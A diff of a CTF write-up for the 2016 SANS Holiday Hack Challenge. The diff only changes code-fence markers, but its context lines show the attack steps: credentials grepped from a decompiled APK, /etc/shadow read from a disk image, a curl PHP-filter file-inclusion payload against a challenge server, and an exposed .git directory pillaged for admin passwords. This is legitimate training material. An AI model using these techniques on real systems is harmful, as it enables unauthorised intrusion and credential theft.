@@ -28,7 +28,7 @@ An APK file is inside the ZIP file and it is password protected. Using the secre
 ### 3) What username and password are embedded in the APK file?
 
 Using apktool, the APK was decompiled. A simple grep of all .smali files reveals a username and password in the b.smali and SplashScreen.smali
-```bash
+```
 $ grep 'password' *
 b.smali:    const-string v1, "password"
 Login$3$1$1.smali:    const-string v1, "We\'ve sent you an email to reset your password!"
@@ -67,7 +67,7 @@ The file was found in SantaGram_4.2/res/raw
 ### 5) What is the password for the "cranpi" account on the Cranberry Pi system?
 
 Gather information on the partitions available in the cranbian image.
-```bash
+```
 root@6333f0f60bf6:~/hhc$ fdisk -l cranbian-jessie.img
 
 Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
@@ -83,7 +83,7 @@ cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux
 ```
 
 Extract the second partition using dd to obtain an ext4 image and mount it. fsck was required before it would let me mount the image.
-```bash
+```
 $ dd bs=70254592 if=cranbian-jessie.img of=cranbian-ext skip=1
 $ losetup /dev/loop2 cranbian-ext
 $ fsck /dev/loop2
@@ -92,7 +92,7 @@ $ mount /dev/loop2 /mnt/
 
 Grab the /etc/passwd and /etc/shadow file.
 
-```bash
+```
 root@6587a3e5f040:/mnt/etc# cat passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -179,7 +179,7 @@ Santa was found in DFER in 1978 (The terminal door with the wumpus game, after g
 
 Scratchy was a tricky terminal. The trick lies in the commands `sudo` and `strings`.
 
-```bash
+```
 scratchy@cbbeb93495e5:/$ sudo -l
 sudo: unable to resolve host cbbeb93495e5
 Matching Defaults entries for scratchy on cbbeb93495e5:
@@ -191,7 +191,7 @@ User scratchy may run the following commands on cbbeb93495e5:
 ```
 
 Part 1:
-```bash
+```
 scratchy@8956a10a16f1:/$ sudo -u itchy strings /out.pcap
 ...snip...
 <input type="hidden" name="part1" value="santasli" />
@@ -199,7 +199,7 @@ scratchy@8956a10a16f1:/$ sudo -u itchy strings /out.pcap
 ```
 
 Part 2:
-```bash
+```
 scratchy@b5d698c4390e:/$ sudo -u itchy strings -e l /out.pcap 
 sudo: unable to resolve host b5d698c4390e
 part2:ttlehelper
@@ -246,7 +246,7 @@ Key: LOOK AT THE PRETTY LIGHTS
 
 A simple `find` will locate the key for the door. 
 
-```bash
+```
 elf@a7ba94688298:~$ find . -type f
 ./.bashrc
 ./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
@@ -270,7 +270,7 @@ Key: open_sesame
 **Cheat:**
 
 1. Hex dump wumpus to extract binary to my own machine
-```bash
+```
 $ od -A x -t x1 -v wumpus
 ```
 
@@ -374,7 +374,7 @@ for room_num in range(1,255):
 ```
 
 Fed the generated steps into the game:
-```bash
+```
 $ python steps_generator.py
 $ ./dungeon < steps_generator.py
 ```
@@ -504,7 +504,7 @@ Response:
 ```
 
 Now just download the mp3 file:
-```bash
+```
 $ wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
 ```
 
@@ -549,7 +549,7 @@ Content-Length: 106
 
 Or in curl:
 
-```bash
+```
 curl -s -k -X $'POST' -H $'Content-Type: application/json' -H $'User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; GT-N7100 Build/MOB30Z)' --data-binary $'{\"operation\":\"ReadCrashDump\",\"data\":{\"crashdump\":\"php://filter/convert.base64-encode/resource=exception\"}}' $'http://ex.northpolewonderland.com/exception.php' | base64 -d
 ```
 
@@ -569,7 +569,7 @@ if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
 ```
 
 Download the audio file:
-```bash
+```
 $ wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
 ```
 
@@ -582,7 +582,7 @@ Found `.git` directory: https://analytics.northpolewonderland.com/.git/ after ru
 Install [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) and clone the `.git` directory.
 
 Found 'administrator' credentials:
-```bash
+```
 $ git log
 commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
 Author: me <me@example.org>
@@ -591,7 +591,7 @@ Date:   Mon Nov 21 21:15:08 2016 -0800
 	Fix database dump
 ```
 
-```bash
+```
 $ git diff-tree -p 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
 ...snip...
 -INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');
